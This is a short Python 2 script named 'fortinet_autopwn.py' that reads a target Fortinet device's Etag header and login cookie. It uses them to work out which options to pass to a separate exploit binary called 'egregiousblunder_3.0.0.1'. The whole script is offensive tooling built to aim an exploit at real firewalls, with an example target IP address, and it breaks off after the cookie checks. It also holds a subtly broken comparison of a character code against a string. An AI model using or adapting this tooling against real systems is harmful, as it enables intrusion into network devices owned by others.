#!/usr/bin/env python
import requests
import sys
import os

__author__ = "Kerwin"
__date__ = "2016-9-25"
if __name__ == '__main__':
	if len(sys.argv) != 2:
		print "[*] Usage: fortinet_autopwn.py [URL of target]"
		print "[*] Example: fortinet_autopwn.py http://72.143.26.54/"
		os._exit(0)

	if 'egregiousblunder_3.0.0.1' not in os.listdir('.'):
		print "[-] Cannot found egregiousblunder_3.0.0.1"
		print "[*] Make sure egregiousblunder_3.0.0.1 is in the same folder with this script!"
		# os._exit(0)
	url = sys.argv[1]
	r = requests.session()
	try:
		etaginfo = r.head(url).headers.get('Etag').strip('"')
	except Exception,e:
		print e
		print "[-] Connection Failed!"
		os._exit(0)
	if not etaginfo:
		print "[-] Couldn't fetch the target Etag info"
		os._exit(0)
	else:
		print "[+]",url,"Etag:",etaginfo

	etag = etaginfo.split('_')[-1]
	if ord(etag[1]) >= '100':
		req2 = r.head(url.strip('/')+'/login')
		if req2.cookies.get_dict().get('APSCOOKIE') == '0&0':
			print "[+]",url,"no cookie needed,use v3 or v4 config"
		elif req2.cookies.get_dict().get('APSCOOKIE_123456789') == '0&0':
			print "[+]",url,"use the option \"--cookienum 123456789\"and use \"-v 4nc\""

